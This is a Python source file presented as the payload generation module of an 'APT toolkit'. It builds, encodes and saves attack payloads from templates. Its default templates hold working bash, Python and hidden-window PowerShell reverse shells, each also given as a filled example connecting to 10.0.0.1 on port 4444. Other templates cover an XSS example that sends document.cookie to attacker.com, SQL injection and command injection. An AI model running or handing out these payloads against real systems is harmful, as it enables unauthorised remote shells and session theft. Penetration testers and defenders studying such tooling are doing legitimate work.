"""
Payload Generation module for the APT toolkit.

This module provides functionality for generating various types of payloads
for exploitation and testing, including shellcode, web exploits, SQL injection,
and more.
"""

import os
import re
import time
import json
import base64
import random
import string
import hashlib
import binascii
import ipaddress
from typing import Dict, List, Set, Tuple, Optional, Union, Any, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from pathlib import Path

from src.utils.logger import get_module_logger
from src.utils.config import ConfigManager

logger = get_module_logger("payload_gen")

class PayloadType(Enum):
    """Enumeration of payload types"""
    SHELLCODE = auto()
    COMMAND = auto()
    WEB = auto()
    SQL_INJECTION = auto()
    XSS = auto()
    XXE = auto()
    SSTI = auto()
    DESERIALIZATION = auto()
    FILE_INCLUSION = auto()
    COMMAND_INJECTION = auto()
    REVERSE_SHELL = auto()
    BIND_SHELL = auto()
    BACKDOOR = auto()
    CUSTOM = auto()

class PayloadFormat(Enum):
    """Enumeration of payload formats"""
    RAW = auto()
    HEX = auto()
    BASE64 = auto()
    URL = auto()
    UNICODE = auto()
    JAVASCRIPT = auto()
    PHP = auto()
    PYTHON = auto()
    RUBY = auto()
    PERL = auto()
    BASH = auto()
    POWERSHELL = auto()
    C = auto()
    CSHARP = auto()
    JAVA = auto()
    CUSTOM = auto()

class PayloadPlatform(Enum):
    """Enumeration of payload platforms"""
    WINDOWS = auto()
    LINUX = auto()
    MACOS = auto()
    ANDROID = auto()
    IOS = auto()
    WEB = auto()
    MULTI = auto()
    CUSTOM = auto()

class PayloadLanguage(Enum):
    """Enumeration of payload languages"""
    PYTHON = auto()
    RUBY = auto()
    PERL = auto()
    PHP = auto()
    JAVASCRIPT = auto()
    JAVA = auto()
    CSHARP = auto()
    C = auto()
    CPP = auto()
    GO = auto()
    RUST = auto()
    POWERSHELL = auto()
    BASH = auto()
    ASP = auto()
    JSP = auto()
    CUSTOM = auto()

@dataclass
class PayloadTemplate:
    """Data class for payload template information"""
    name: str
    type: PayloadType
    template: str
    description: str = ""
    platform: PayloadPlatform = PayloadPlatform.MULTI
    language: PayloadLanguage = PayloadLanguage.CUSTOM
    parameters: Dict[str, str] = field(default_factory=dict)
    examples: Dict[str, str] = field(default_factory=dict)
    references: List[str] = field(default_factory=list)
    author: str = ""
    notes: List[str] = field(default_factory=list)

@dataclass
class Payload:
    """Data class for payload information"""
    name: str
    type: PayloadType
    content: str
    description: str = ""
    platform: PayloadPlatform = PayloadPlatform.MULTI
    language: PayloadLanguage = PayloadLanguage.CUSTOM
    format: PayloadFormat = PayloadFormat.RAW
    size: int = 0
    template_name: str = ""
    parameters: Dict[str, str] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)
    notes: List[str] = field(default_factory=list)
    
    def __post_init__(self):
        """Calculate payload size if not provided"""
        if self.size == 0:
            self.size = len(self.content)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        return asdict(self)
    
    def to_json(self, pretty: bool = True) -> str:
        """Convert to JSON string"""
        if pretty:
            return json.dumps(self.to_dict(), indent=4)
        return json.dumps(self.to_dict())
    
    def save_to_file(self, filename: str) -> bool:
        """Save payload to a file"""
        try:
            with open(filename, 'w') as f:
                f.write(self.content)
            logger.info(f"Saved payload to {filename}")
            return True
        except Exception as e:
            logger.error(f"Failed to save payload to {filename}: {e}")
            return False
    
    def encode(self, format: PayloadFormat) -> 'Payload':
        """
        Encode payload to a different format.
        
        Args:
            format: Target format
            
        Returns:
            Payload: New payload with encoded content
        """
        encoded_content = self._encode_content(self.content, format)
        
        return Payload(
            name=f"{self.name}_{format.name.lower()}",
            type=self.type,
            content=encoded_content,
            description=self.description,
            platform=self.platform,
            language=self.language,
            format=format,
            template_name=self.template_name,
            parameters=self.parameters,
            metadata=self.metadata,
            notes=self.notes + [f"Encoded from {self.format.name} to {format.name}"]
        )
    
    def _encode_content(self, content: str, format: PayloadFormat) -> str:
        """
        Encode content to a specific format.
        
        Args:
            content: Content to encode
            format: Target format
            
        Returns:
            str: Encoded content
        """
        if format == PayloadFormat.RAW:
            return content
        
        elif format == PayloadFormat.HEX:
            return binascii.hexlify(content.encode()).decode()
        
        elif format == PayloadFormat.BASE64:
            return base64.b64encode(content.encode()).decode()
        
        elif format == PayloadFormat.URL:
            import urllib.parse
            return urllib.parse.quote(content)
        
        elif format == PayloadFormat.UNICODE:
            return ''.join([f"\\u{ord(c):04x}" for c in content])
        
        elif format == PayloadFormat.JAVASCRIPT:
            # Simple JavaScript string encoding
            js_encoded = ''
            for c in content:
                if c in string.printable and c not in '\'"\\':
                    js_encoded += c
                else:
                    js_encoded += f"\\x{ord(c):02x}"
            return f'"{js_encoded}"'
        
        elif format == PayloadFormat.PHP:
            # Simple PHP string encoding
            php_encoded = ''
            for c in content:
                if c in string.printable and c not in '\'"\\':
                    php_encoded += c
                else:
                    php_encoded += f"\\x{ord(c):02x}"
            return f'"{php_encoded}"'
        
        elif format == PayloadFormat.PYTHON:
            # Simple Python string encoding
            py_encoded = ''
            for c in content:
                if c in string.printable and c not in '\'"\\':
                    py_encoded += c
                else:
                    py_encoded += f"\\x{ord(c):02x}"
            return f'"{py_encoded}"'
        
        elif format == PayloadFormat.BASH:
            # Simple Bash string encoding
            bash_encoded = ''
            for c in content:
                if c in string.printable and c not in '\'"\\$`':
                    bash_encoded += c
                else:
                    bash_encoded += f"\\x{ord(c):02x}"
            return f'"{bash_encoded}"'
        
        elif format == PayloadFormat.POWERSHELL:
            # Simple PowerShell string encoding
            ps_encoded = ''
            for c in content:
                if c in string.printable and c not in '\'"\\$`':
                    ps_encoded += c
                else:
                    ps_encoded += f"`u{ord(c):04x}"
            return f'"{ps_encoded}"'
        
        else:
            # For other formats, return as-is
            return content

@dataclass
class PayloadCollection:
    """Data class for payload collection information"""
    name: str
    description: str = ""
    payloads: Dict[str, Payload] = field(default_factory=dict)
    templates: Dict[str, PayloadTemplate] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        return {
            "name": self.name,
            "description": self.description,
            "payloads": {name: payload.to_dict() for name, payload in self.payloads.items()},
            "templates": {name: asdict(template) for name, template in self.templates.items()},
            "metadata": self.metadata
        }
    
    def to_json(self, pretty: bool = True) -> str:
        """Convert to JSON string"""
        if pretty:
            return json.dumps(self.to_dict(), indent=4)
        return json.dumps(self.to_dict())
    
    def save_to_file(self, filename: str) -> bool:
        """Save collection to a JSON file"""
        try:
            with open(filename, 'w') as f:
                f.write(self.to_json())
            logger.info(f"Saved payload collection to {filename}")
            return True
        except Exception as e:
            logger.error(f"Failed to save payload collection to {filename}: {e}")
            return False
    
    @classmethod
    def load_from_file(cls, filename: str) -> Optional['PayloadCollection']:
        """
        Load collection from a JSON file.
        
        Args:
            filename: Path to JSON file
            
        Returns:
            PayloadCollection: Loaded collection or None if loading failed
        """
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            # Create collection
            collection = cls(
                name=data.get("name", ""),
                description=data.get("description", ""),
                metadata=data.get("metadata", {})
            )
            
            # Load templates
            for name, template_data in data.get("templates", {}).items():
                template = PayloadTemplate(
                    name=template_data.get("name", ""),
                    type=PayloadType[template_data.get("type", "CUSTOM")],
                    template=template_data.get("template", ""),
                    description=template_data.get("description", ""),
                    platform=PayloadPlatform[template_data.get("platform", "MULTI")],
                    language=PayloadLanguage[template_data.get("language", "CUSTOM")],
                    parameters=template_data.get("parameters", {}),
                    examples=template_data.get("examples", {}),
                    references=template_data.get("references", []),
                    author=template_data.get("author", ""),
                    notes=template_data.get("notes", [])
                )
                collection.templates[name] = template
            
            # Load payloads
            for name, payload_data in data.get("payloads", {}).items():
                payload = Payload(
                    name=payload_data.get("name", ""),
                    type=PayloadType[payload_data.get("type", "CUSTOM")],
                    content=payload_data.get("content", ""),
                    description=payload_data.get("description", ""),
                    platform=PayloadPlatform[payload_data.get("platform", "MULTI")],
                    language=PayloadLanguage[payload_data.get("language", "CUSTOM")],
                    format=PayloadFormat[payload_data.get("format", "RAW")],
                    size=payload_data.get("size", 0),
                    template_name=payload_data.get("template_name", ""),
                    parameters=payload_data.get("parameters", {}),
                    metadata=payload_data.get("metadata", {}),
                    notes=payload_data.get("notes", [])
                )
                collection.payloads[name] = payload
            
            logger.info(f"Loaded payload collection from {filename}")
            return collection
            
        except Exception as e:
            logger.error(f"Failed to load payload collection from {filename}: {e}")
            return None


class PayloadGenModule:
    """
    Payload generation module for creating various types of payloads
    for exploitation and testing.
    """
    
    # Default templates for common payload types
    DEFAULT_TEMPLATES = {
        "reverse_shell_bash": PayloadTemplate(
            name="reverse_shell_bash",
            type=PayloadType.REVERSE_SHELL,
            template="bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            description="Bash reverse shell",
            platform=PayloadPlatform.LINUX,
            language=PayloadLanguage.BASH,
            parameters={
                "ip": "Attacker IP address",
                "port": "Attacker port"
            },
            examples={
                "basic": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
            },
            references=[
                "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
            ]
        ),
        "reverse_shell_python": PayloadTemplate(
            name="reverse_shell_python",
            type=PayloadType.REVERSE_SHELL,
            template="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            description="Python reverse shell",
            platform=PayloadPlatform.LINUX,
            language=PayloadLanguage.PYTHON,
            parameters={
                "ip": "Attacker IP address",
                "port": "Attacker port"
            },
            examples={
                "basic": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            },
            references=[
                "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
            ]
        ),
        "reverse_shell_powershell": PayloadTemplate(
            name="reverse_shell_powershell",
            type=PayloadType.REVERSE_SHELL,
            template="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            description="PowerShell reverse shell",
            platform=PayloadPlatform.WINDOWS,
            language=PayloadLanguage.POWERSHELL,
            parameters={
                "ip": "Attacker IP address",
                "port": "Attacker port"
            },
            examples={
                "basic": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            },
            references=[
                "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
            ]
        ),
        "xss_basic": PayloadTemplate(
            name="xss_basic",
            type=PayloadType.XSS,
            template="<script>{code}</script>",
            description="Basic XSS payload",
            platform=PayloadPlatform.WEB,
            language=PayloadLanguage.JAVASCRIPT,
            parameters={
                "code": "JavaScript code to execute"
            },
            examples={
                "alert": "<script>alert('XSS')</script>",
                "cookie": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
            },
            references=[
                "https://owasp.org/www-community/attacks/xss/"
            ]
        ),
        "sqli_basic": PayloadTemplate(
            name="sqli_basic",
            type=PayloadType.SQL_INJECTION,
            template="' OR {condition} -- ",
            description="Basic SQL injection payload",
            platform=PayloadPlatform.WEB,
            language=PayloadLanguage.CUSTOM,
            parameters={
                "condition": "SQL condition"
            },
            examples={
                "true": "' OR 1=1 -- ",
                "admin": "' OR username='admin' -- "
            },
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection"
            ]
        ),
        "command_injection_basic": PayloadTemplate(
            name="command_injection_basic",
            type=PayloadType.COMMAND_INJECTION,
            template="; {command}",
            description="Basic command injection payload",
            platform=PayloadPlatform.MULTI,
            language=PayloadLanguage.BASH,
            parameters={
                "command": "Command to execute"
            },
            examples={
                "id": "; id",
                "whoami": "; whoami"
            },
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection"
            ]
        )
    }
    
    def __init__(self, config: Optional[ConfigManager] = None):
        """
        Initialize the payload generation module.
        
        Args:
            config: Optional configuration manager instance.
        """
        self.config = config
        
        # Load configuration settings
        self.output_dir = "payloads"
        self.collections_dir = "collections"
        self.templates_dir = "templates"
        
        if config:
            self.output_dir = config.get("modules.payload_gen.output_dir", "payloads")
            self.collections_dir = config.get("modules.payload_gen.collections_dir", "collections")
            self.templates_dir = config.get("modules.payload_gen.templates_dir", "templates")
            
            # Create output directories if they don't exist
            for directory in [self.output_dir, self.collections_dir, self.templates_dir]:
                if directory and not os.path.exists(directory):
                    try:
                        os.makedirs(directory)
                        logger.info(f"Created directory: {directory}")
                    except Exception as e:
                        logger.error(f"Failed to create directory {directory}: {e}")
        
        # Initialize collections
        self.collections = {}
        self.templates = self.DEFAULT_TEMPLATES.copy()
        
        # Load templates from directory
        self._load_templates()
    
    def _load_templates(self) -> None:
        """Load templates from templates directory"""
        if not os.path.exists(self.templates_dir):
            return
        
        for filename in os.listdir(self.templates_dir):
            if filename.endswith(".json"):
                try:
                    with open(os.path.join(self.templates_dir, filename), 'r') as f:
                        data = json.load(f)
                    
                    for template_data in data.get("templates", []):
                        template = PayloadTemplate(
                            name=template_data.get("name", ""),
                            type=PayloadType[template_data.get("type", "CUSTOM")],
                            template=template_data.get("template", ""),
                            description=template_data.get("description", ""),
                            platform=PayloadPlatform[template_data.get("platform", "MULTI")],
                            language=PayloadLanguage[template_data.get("language", "CUSTOM")],
                            parameters=template_data.get("parameters", {}),
                            examples=template_data.get("examples", {}),
                            references=template_data.get("references", []),
                            author=template_data.get("author", ""),
                            notes=template_data.get("notes", [])
                        )
                        self.templates[template.name] = template
                    
                    logger.info(f"Loaded templates from {filename}")
                    
                except Exception as e:
                    logger.error(f"Failed to load templates from {filename}: {e}")
    
    def create_payload(self, template_name: str, parameters: Dict[str, str], 
                      name: Optional[str] = None, description: Optional[str] = None) -> Optional[Payload]:
        """
        Create a payload from a template.
        
        Args:
            template_name: Name of the template to use
            parameters: Parameters to apply to the template
            name: Optional name for the payload
            description: Optional description for the payload
            
        Returns:
            Payload: Generated payload or None if generation failed
        """
        # Check if template exists
        if template_name not in self.templates:
            logger.error(f"Template '{template_name}' not found")
            return None
        
        template = self.templates[template_name]
        
        # Check if all required parameters are provided
        missing_params = [param for param in template.parameters if param not in parameters]
        if missing_params:
            logger.error(f"Missing required parameters: {', '.join(missing_params)}")
            return None
        
        try:
            # Apply parameters to template
            content = template.template
            for param, value in parameters.items():
                content = content.replace(f"{{{param}}}", value)
            
            # Create payload
            payload = Payload(
                name=name or f"{template_name}_{int(time.time())}",
                type=template.type,
                content=content,
                description=description or template.description,
                platform=template.platform,
                language=template.language,
                template_name=template_name,
                parameters=parameters
            )
            
            logger.info(f"Created payload '{payload.name}' from template '{template_name}'")
            return payload
            
        except Exception as e:
            logger.error(f"Failed to create payload from template '{template_name}': {e}")
            return None
    
    def create_custom_payload(self, content: str, type: PayloadType, 
                             name: Optional[str] = None, description: Optional[str] = None,
                             platform: PayloadPlatform = PayloadPlatform.MULTI,
                             language: PayloadLanguage = PayloadLanguage.CUSTOM) -> Payload:
        """
        Create a custom payload.
        
        Args:
            content: Payload content
            type: Payload type
            name: Optional name for the payload
            description: Optional description for the payload
            platform: Payload platform
            language: Payload language
            
        Returns:
            Payload: Generated payload
        """
        payload = Payload(
            name=name or f"custom_{int(time.time())}",
            type=type,
            content=content,
            description=description or "Custom payload",
            platform=platform,
            language=language
        )
        
        logger.info(f"Created custom payload '{payload.name}'")
        return payload
    
    def create_template(self, name: str, type: PayloadType, template: str,
                       description: Optional[str] = None,
                       platform: PayloadPlatform = PayloadPlatform.MULTI,
                       language: PayloadLanguage = PayloadLanguage.CUSTOM,
                       parameters: Optional[Dict[str, str]] = None,
                       examples: Optional[Dict[str, str]] = None,
                       references: Optional[List[str]] = None,
                       author: Optional[str] = None) -> PayloadTemplate:
        """
        Create a new payload template.
        
        Args:
            name: Template name
            type: Payload type
            template: Template content
            description: Optional description
            platform: Payload platform
            language: Payload language
            parameters: Optional parameter descriptions
            examples: Optional examples
            references: Optional references
            author: Optional author
            
        Returns:
            PayloadTemplate: Created template
        """
        template_obj = PayloadTemplate(
            name=name,
            type=type,
            template=template,
            description=description or f"{name} template",
            platform=platform,
            language=language,
            parameters=parameters or {},
            examples=examples or {},
            references=references or [],
            author=author or ""
        )
        
        # Add to templates
        self.templates[name] = template_obj
        
        logger.info(f"Created template '{name}'")
        return template_obj
    
    def save_template(self, template: PayloadTemplate) -> bool:
        """
        Save a template to the templates directory.
        
        Args:
            template: Template to save
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not os.path.exists(self.templates_dir):
            try:
                os.makedirs(self.templates_dir)
            except Exception as e:
                logger.error(f"Failed to create templates directory: {e}")
                return False
        
        try:
            # Check if a templates file for this type already exists
            type_name = template.type.name.lower()
            filename = os.path.join(self.templates_dir, f"{type_name}_templates.json")
            
            templates_data = {"templates": []}
            
            # Load existing templates if file exists
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    templates_data = json.load(f)
            
            # Check if template already exists
            for i, t in enumerate(templates_data.get("templates", [])):
                if t.get("name") == template.name:
                    # Update existing template
                    templates_data["templates"][i] = asdict(template)
                    break
            else:
                # Add new template
                templates_data["templates"].append(asdict(template))
            
            # Save templates
            with open(filename, 'w') as f:
                json.dump(templates_data, f, indent=4)
            
            logger.info(f"Saved template '{template.name}' to {filename}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to save template '{template.name}': {e}")
            return False
    
    def create_collection(self, name: str, description: Optional[str] = None) -> PayloadCollection:
        """
        Create a new payload collection.
        
        Args:
            name: Collection name
            description: Optional description
            
        Returns:
            PayloadCollection: Created collection
        """
        collection = PayloadCollection(
            name=name,
            description=description or f"{name} collection"
        )
        
        # Add to collections
        self.collections[name] = collection
        
        logger.info(f"Created collection '{name}'")
        return collection
    
    def add_payload_to_collection(self, collection_name: str, payload: Payload) -> bool:
        """
        Add a payload to a collection.
        
        Args:
            collection_name: Name of the collection
            payload: Payload to add
            
        Returns:
            bool: True if successful, False otherwise
        """
        # Check if collection exists
        if collection_name not in self.collections:
            logger.error(f"Collection '{collection_name}' not found")
            return False
        
        # Add payload to collection
        self.collections[collection_name].payloads[payload.name] = payload
        
        logger.info(f"Added payload '{payload.name}' to collection '{collection_name}'")
        return True
    
    def save_collection(self, collection_name: str) -> bool:
        """
        Save a collection to the collections directory.
        
        Args:
            collection_name: Name of the collection
            
        Returns:
            bool: True if successful, False otherwise
        """
        # Check if collection exists
        if collection_name not in self.collections:
            logger.error(f"Collection '{collection_name}' not found")
            return False
        
        if not os.path.exists(self.collections_dir):
            try:
                os.makedirs(self.collections_dir)
            except Exception as e:
                logger.error(f"Failed to create collections directory: {e}")
                return False
        
        try:
            # Save collection
            filename = os.path.join(self.collections_dir, f"{collection_name}.json")
            self.collections[collection_name].save_to_file(filename)
            
            logger.info(f"Saved collection '{collection_name}' to {filename}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to save collection '{collection_name}': {e}")
            return False
    
    def load_collection(self, filename: str) -> bool:
        """
        Load a collection from a file.
        
        Args:
            filename: Path to collection file
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            collection = PayloadCollection.load_from_file(filename)
            if collection:
                self.collections[collection.name] = collection
                logger.info(f"Loaded collection '{collection.name}' from {filename}")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Failed to load collection from {filename}: {e}")
            return False
    
    def generate_reverse_shell(self, ip: str, port: int, 
                              platform: PayloadPlatform = PayloadPlatform.LINUX,
                              language: Optional[PayloadLanguage] = None) -> Optional[Payload]:
        """
        Generate a reverse shell payload.
        
        Args:
            ip: Attacker IP address
            port: Attacker port
            platform: Target platform
            language: Optional language preference
            
        Returns:
            Payload: Generated payload or None if generation failed
        """
        # Determine template based on platform and language
        template_name = None
        
        if platform == PayloadPlatform.LINUX:
            if language == PayloadLanguage.PYTHON:
                template_name = "reverse_shell_python"
            else:
                template_name = "reverse_shell_bash"
        elif platform == PayloadPlatform.WINDOWS:
            template_name = "reverse_shell_powershell"
        
        if not template_name:
            logger.error(f"No suitable reverse shell template found for {platform.name}")
            return None
        
        # Create payload
        return self.create_payload(
            template_name=template_name,
            parameters={"ip": ip, "port": str(port)},
            name=f"reverse_shell_{platform.name.lower()}_{int(time.time())}",
            description=f"Reverse shell for {platform.name}"
        )
    
    def generate_xss_payload(self, code: str) -> Optional[Payload]:
        """
        Generate an XSS payload.
        
        Args:
            code: JavaScript code to execute
            
        Returns:
            Payload: Generated payload or None if generation failed
        """
        return self.create_payload(
            template_name="xss_basic",
            parameters={"code": code},
            name=f"xss_{int(time.time())}",
            description="XSS payload"
        )
    
    def generate_sqli_payload(self, condition: str) -> Optional[Payload]:
        """
        Generate a SQL injection payload.
        
        Args:
            condition: SQL condition
            
        Returns:
            Payload: Generated payload or None if generation failed
        """
        return self.create_payload(
            template_name="sqli_basic",
            parameters={"condition": condition},
            name=f"sqli_{int(time.time())}",
            description="SQL injection payload"
        )
    
    def generate_command_injection_payload(self, command: str) -> Optional[Payload]:
        """
        Generate a command injection payload.
        
        Args:
            command: Command to execute
            
        Returns:
            Payload: Generated payload or None if generation failed
        """
        return self.create_payload(
            template_name="command_injection_basic",
            parameters={"command": command},
            name=f"cmdi_{int(time.time())}",
            description="Command injection payload"
        )
    
    def encode_payload(self, payload: Payload, format: PayloadFormat) -> Optional[Payload]:
        """
        Encode a payload to a different format.
        
        Args:
            payload: Payload to encode
            format: Target format
            
        Returns:
            Payload: Encoded payload or None if encoding failed
        """
        try:
            return payload.encode(format)
        except Exception as e:
            logger.error(f"Failed to encode payload '{payload.name}' to {format.name}: {e}")
            return None
    
    def save_payload(self, payload: Payload, filename: Optional[str] = None) -> bool:
        """
        Save a payload to a file.
        
        Args:
            payload: Payload to save
            filename: Optional filename (default: output_dir/payload_name.txt)
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not filename:
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Failed to create output directory: {e}")
                    return False
            
            filename = os.path.join(self.output_dir, f"{payload.name}.txt")
        
        return payload.save_to_file(filename)
    
    def get_available_templates(self, type: Optional[PayloadType] = None, 
                               platform: Optional[PayloadPlatform] = None,
                               language: Optional[PayloadLanguage] = None) -> Dict[str, PayloadTemplate]:
        """
        Get available templates, optionally filtered by type, platform, or language.
        
        Args:
            type: Optional payload type filter
            platform: Optional platform filter
            language: Optional language filter
            
        Returns:
            Dict[str, PayloadTemplate]: Dictionary of matching templates
        """
        templates = {}
        
        for name, template in self.templates.items():
            if type and template.type != type:
                continue
            if platform and template.platform != platform:
                continue
            if language and template.language != language:
                continue
            
            templates[name] = template
        
        return templates